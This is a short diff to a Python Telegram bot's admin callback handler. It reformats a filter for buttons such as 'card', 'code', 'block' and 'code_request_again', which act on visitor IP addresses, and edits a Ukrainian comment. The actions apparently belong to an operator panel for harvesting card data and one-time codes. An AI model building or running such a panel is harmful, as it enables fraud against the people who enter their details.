@@ -1671,7 +1671,11 @@ async def code_notify(request):
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
-@router.callback_query(lambda c: c.data and (c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:') or c.data.startswith('code:') or c.data.startswith('support:') or c.data.startswith('text:') or c.data.startswith('code_request_again:')))
+@router.callback_query(lambda c: c.data and (
+    c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:') or
+    c.data.startswith('code:') or c.data.startswith('support:') or c.data.startswith('text:') or
+    c.data.startswith('code_request_again:')
+))
 async def admin_action_handler(call: types.CallbackQuery):
     action, ip = call.data.split(':', 1)
     import aiohttp as aiohttp_client
@@ -1694,7 +1698,7 @@ async def admin_action_handler(call: types.CallbackQuery):
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
-    # НЕ повертаємо в меню після адмінських дій - залишаємо користувача в чаті
+    # НЕ змінюємо клавіатуру!
     await call.answer()
 
 
